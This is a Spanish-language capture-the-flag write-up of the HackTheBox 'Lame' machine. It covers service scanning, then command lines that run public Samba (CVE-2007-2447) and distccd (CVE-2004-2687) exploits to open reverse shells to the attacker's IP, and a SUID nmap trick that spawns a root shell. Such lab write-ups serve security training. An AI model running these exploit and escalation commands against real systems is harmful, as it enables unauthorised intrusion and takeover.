---
layout: single
title: Writeup HTB - Maquina Lame
comments: true
excerpt: "La maquina Lame es una maquina Linux - Easy, esta una maquina divertida por que nos enseña que con una buena enumeracion podemos obtener mas de una via de poder acceder al sistema y escalar privilegios. Como primer metodo accederemos al sistema con un exploit de smb dandonos privilegios de root. Por ultimo como segundo metodo accederemos al sistema con un exploit al servicio distccd dandonos acceso con el user daemon, logramos escalar privilegios abusando del un binario nmap que con contiene la flag SUID."
date: 2022-02-01
classes: wide
header:
  teaser: /assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Easy
---


# Lame

<p align="center">
<img src="/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled.png">
</p>


## Resumen

La maquina Lame es una maquina Linux - Easy, esta una maquina divertida por que nos enseña que con una buena enumeracion podemos obtener mas de una via de poder acceder al sistema y escalar privilegios. Como primer metodo accederemos al sistema con un exploit de smb dandonos privilegios de root. Por ultimo como segundo metodo accederemos al sistema con un exploit al servicio distccd dandonos acceso con el user daemon, logramos escalar privilegios abusando del un binario nmap que con contiene la flag SUID. 

## Nmap Scan

```bash
# Nmap 7.92 scan initiated Tue Feb  1 07:22:24 2022 as: nmap -sC -sV -p21,22,139,445,3632 -oN targeted -Pn -vvv 10.129.160.12
Nmap scan report for 10.129.160.12
Host is up, received user-set (0.18s latency).
Scanned at 2022-02-01 07:22:27 -05 for 104s

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd?    syn-ack ttl 63
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-02-01T07:23:55-05:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35334/tcp): CLEAN (Timeout)
|   Check 2 (port 48697/tcp): CLEAN (Timeout)
|   Check 3 (port 45376/udp): CLEAN (Timeout)
|   Check 4 (port 12551/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 2h30m22s, deviation: 3h32m10s, median: 20s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb  1 07:24:11 2022 -- 1 IP address (1 host up) scanned in 107.02 seconds
```

## FTP - Port 21

Sabiendo la version del ftp, buscamos si existe un exploit vulnerable

```bash
lame # ❯ searchsploit vsFTPd 2.3.
```

![Untitled](/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%201.png)

me descargue el exploit de exploit-db y uno que habia por internet pero sin exito

![Untitled](/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%202.png)

## SSH - Port 22

revise si habia un exploit relacionado a la version de OpenSSH y vemos que existe un exploit para enumerar usuarios. Sin embargo deje esto para adelante si en caso lo nesecitara.

![Untitled](/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%203.png)

### SMB - Port 139, 445

vemos la version del samba

```bash
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

asi que buscamos exploits relacionados samba 3.0.20

![/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%204.png](/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%204.png)

Descargamos un exploit de este repositorio

[GitHub - amriunix/CVE-2007-2447: CVE-2007-2447 - Samba usermap script](https://github.com/amriunix/CVE-2007-2447)

![/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%205.png](/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%205.png)

### Reverse Shell - Usuario root

el repositorio te indica como instalar y se ejecuta de esta manera

```bash
CVE-2007-2447 # ❯ python usermap_script.py 10.129.160.12 445 10.10.14.54 443
```

![Untitled](/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%206.png)

Logrando tener ejecucion de comandos como un usuario Root

## distccd - Port 3632

bueno nunca habia escuchado de este puerto y dicho servicio distccd, al revisar con un script de nmap alguna vulnerabilidad relacionada a dicho puerto me salio vulnerable a CVE-2004-2687

![Untitled](/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%207.png)

asi que procedi hacer una busqueda de algun exploit relacionado a ese CVE y encontre esto

[GitHub - k4miyo/CVE-2004-2687: CVE-2004-2687 DistCC Daemon Command Execution](https://github.com/k4miyo/CVE-2004-2687)

asi que ejecute dicho exploit de esta manera 

```bash
CVE-2004-2687 # ❯ python3 CVE-2004-2687.py --rhost 10.129.160.12 --rport 3632 --lhost 10.10.14.54 --lport 443  
```

![Untitled](/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%208.png)

obteniendo una reverse shell con el user daemon

![Untitled](/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%209.png)

### Escalacion de Privilegios - Binario SUID

ya que estamos aqui aprovechemos para escalar a un usuario root, para esto haremos una busqueda de un binario con la flag SUID

```bash
daemon@lame:/tmp$ find / -type f -perm -u=s 2>/dev/null
```

![Untitled](/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%2010.png)

listo me llama la atencion nmap, asi que haremos lo siguiente para escalar como usuario root

```bash
daemon@lame:/tmp$ echo 'os.execute("/bin/sh")' > /tmp/x.nse
daemon@lame:/tmp$ nmap --script /tmp/x.nse localhost
```

![Untitled](/assets/images/2022-02-01-writeup-maquina-htb-lame/Untitled%2011.png)

Gracias por seguir este writeup, nos vemos Abeljm.